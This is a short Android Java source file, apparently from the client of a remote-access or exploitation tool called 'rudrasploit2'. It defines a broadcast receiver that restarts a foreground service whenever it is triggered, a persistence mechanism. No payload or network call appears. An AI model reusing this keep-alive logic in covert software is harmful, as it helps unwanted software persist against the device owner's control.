package com.rudrasploit2.client.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.rudrasploit2.client.ForegroundService;
import com.rudrasploit2.client.MainService;

public class ServiceTerminate extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        context.startService(new Intent(context, ForegroundService.class));
    }
}
